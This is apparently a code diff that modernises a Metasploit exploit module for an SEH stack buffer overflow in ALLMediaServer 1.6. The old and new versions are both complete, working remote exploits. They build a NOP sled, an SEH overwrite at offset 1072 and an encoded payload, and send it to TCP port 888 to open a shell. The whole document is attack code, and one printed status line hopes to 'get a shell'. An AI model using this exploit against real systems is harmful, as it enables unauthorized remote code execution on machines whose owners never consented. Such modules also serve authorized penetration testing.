@@ -2,89 +2,69 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-# Author: Hejap Zairy
-# Date: 1.08.2022
-# Exploit Prof
-# Proof and Exploit:
-#image:https://i.imgur.com/yLrRR2t.png
-#video:https://streamable.com/x4i50c
 
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GoodRanking
 
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Seh
 
-require 'msf/core'
- 
-class Metasploit4 < Msf::Exploit::Remote
-    Rank = ExcellentRanking
- 
-    include Msf::Exploit::Remote::Tcp
-    include Msf::Exploit::Seh
- 
-    def initialize(info = {})
-        super(update_info(info,
-            'Name'           => 'ALLMediaServer 1.6  Buffer Overflow',
-            'Description'    => %q{
-                This module exploits a stack buffer overflow in ALLMediaServer 1.6
-                The vulnerability is caused due to a boundary error within the
-                handling of HTTP request.
-                Thank you Saud Alenazi and 0xSaudi 
-                and Muhammad Al Ahmadi and all the friends in Tuwaiq i Love Tuwaiq
-            },
-            'License'        => MSF_LICENSE,
-            'Author'         =>
-                [
-                    'Hejap Zairy Al-Sharif', # Remote exploit and Metasploit module
-                ],
-            'DefaultOptions' =>
-                {
-                    'ExitFunction' => 'process', #none/process/thread/seh
-                },
-            'Platform'       => 'win',
-            'Payload'        =>
-                {
-                    'BadChars' => '\x00\x0a\x0d\xff' 
-                },
- 
-            'Targets'        =>
-                [
-                    [ 'ALLMediaServer 1.6 / Windows 10  - English',
-                        {
-                            'Ret'       =>   0x0040590B, # POP ESI # POP EBX  # RET 
-                            'Offset'    =>   1072
-                        }
-                    ],
-                    [ 'ALLMediaServer 1.6 / Windows XP SP3 - English',
-                        {
-                            'Ret'       =>   0x0040590B, # POP ESI # POP EBX  # RET 
-                            'Offset'    =>   1072
-                        }
-                    ],
-                    [ 'ALLMediaServer 1.6 / Windows 7 SP1 - English',
-                        {
-                            'Ret'       =>   0x0040590B, # POP ESI # POP EBX  # RET 
-                            'Offset'    =>   1072
-                        }
-                    ],
-                ],
-            'Privileged'     => false,
-            'DisclosureDate' => 'Apr 1 2022',
-            'DefaultTarget'  => 1))
- 
-        register_options([Opt::RPORT(888)], self.class)
- 
-    end
-	
-    def exploit
-        connect
-	buffer = ""
-        buffer << make_nops(target['Offset'])
-        buffer << "\xeb\x06\x90\x90"
-        buffer << "\x0B\x59\x40\x00"
-	buffer << make_nops(100)
-        buffer << payload.encoded
-        buffer << make_nops(50)
-        print_status("Sending payload ... \n Exploit MediaServer")
-        sock.put(buffer)
-	handler
-        disconnect
-    end
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'ALLMediaServer 1.6 SEH Buffer Overflow',
+        'Description' => %q{
+          This module exploits a stack buffer overflow leading to a SEH handler overwrite
+          in ALLMediaServer 1.6. The vulnerability is caused due to a boundary error
+          within the handling of a HTTP request.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Hejap Zairy Al-Sharif', # Aka @Matrix07ksa. Remote exploit and Metasploit module
+        ],
+        'DefaultOptions' => {
+          'EXITFUNC' => 'process'
+        },
+        'Platform' => 'win',
+        'Arch' => [ARCH_X86, ARCH_X64],
+        'Payload' => {
+          'BadChars' => '\x00\x0a\x0d\xff'
+        },
+        'Targets' => [
+          [
+            'ALLMediaServer 1.6',
+            {
+              'Ret' => 0x0040590B, # POP ESI # POP EBX # RET
+              'Offset' => 1072
+            }
+          ],
+        ],
+        'Privileged' => false,
+        'DisclosureDate' => '2022-04-01',
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN], # If this fails the service will go down and will not restart.
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS]
+        }
+      )
+    )
+    register_options([Opt::RPORT(888)])
+  end
+
+  def exploit
+    connect
+    buffer = ''
+    buffer << make_nops(target['Offset'])
+    buffer << generate_seh_record(target.ret)
+    buffer << make_nops(100)
+    buffer << payload.encoded
+    buffer << make_nops(50)
+    print_status('Sending payload to exploit MediaServer...')
+    sock.put(buffer)
+    print_status('Sent payload...hopefully we should get a shell!')
+    handler
+    disconnect
+  end
 end
